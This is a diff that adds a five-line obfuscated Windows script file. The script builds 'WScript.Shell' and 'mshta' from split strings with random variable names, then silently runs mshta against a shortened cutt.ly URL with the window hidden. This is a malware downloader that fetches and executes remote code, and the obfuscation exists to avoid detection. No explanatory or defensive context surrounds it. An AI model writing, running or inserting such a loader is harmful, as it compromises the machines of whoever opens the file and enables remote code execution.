@@ -1,0 +1,5 @@
+gthnadqs = ("cript.Sh")
+var hscgcuxh = WScript.CreateObject("WS"+gthnadqs+"ell")
+amrrsqtl = ("msh")
+ebfmhcpf = ("ta ")
+hscgcuxh.Run((amrrsqtl+ebfmhcpf)+" https://cutt.ly/Qb5ROtU",0)
